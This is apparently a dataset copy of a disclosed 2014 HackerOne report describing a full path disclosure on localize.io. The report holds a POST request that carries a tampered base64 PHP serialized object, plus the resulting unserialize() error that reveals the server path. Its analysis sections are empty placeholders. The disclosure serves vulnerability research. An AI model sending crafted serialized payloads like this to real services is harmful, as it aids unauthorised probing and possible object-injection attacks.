---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '7972'
original_report_id: '7972'
title: Full Path Disclosure
weakness: Information Disclosure
team_handle: localize
created_at: '2014-04-18T06:56:38.044Z'
disclosed_at: '2014-04-19T06:56:55.425Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 2
tags:
- hackerone
- information-disclosure
---

# Full Path Disclosure

## Metadata

- HackerOne Report ID: 7972
- Weakness: Information Disclosure
- Program: localize
- Disclosed At: 2014-04-19T06:56:55.425Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Not my best piece of work, but the following file results in a full path disclosure if review[phraseobject] is given the wrong parameter.

http://www.localize.io/review/3C/languages/5
POST

>CSRFToken=Njg0ODMwOTM1MzUwYzk5ZTFiOWU3OC4zMDk0MzM1NQ%3D%3D&review%5BeditID%5D=cw3&review%5BreferenceValue%5D=test&review%5BphraseObject%5D=TzoyMToiUGhyYXNlX0FuZHJvaWRfU3RyaW5nIjo2OntzOjg6IgAqAHZhbHVlIaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaajtzOjQ6InRlc3QiO3M6NToiACoAaWQiO2k6MDtzOjEyOiIAKgBwaHJhc2VLZXkiO3M6NzoidGVzdGluZyI7czoxMDoiACoAZ3JvdXBJRCI7aTowO3M6MjQ6IgAqAGVuYWJsZWRGb3JUcmFuc2xhdGlvbiI7YjoxO3M6MTA6IgAqAGlzRW1wdHkiO2I6MDt9&review%5BphraseKey%5D=testing&review%5BphraseSubKey%5D=0&review%5BcontributorID%5D=sh&review%5BnewValue%5D=1&review%5Baction%5D=approve

Notice: unserialize(): Error at offset 133 of 192 bytes in /var/www/vhosts/lvps178-77-99-228.dedicated.hosteurope.de/httpdocs_localize/index.php on line 244

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
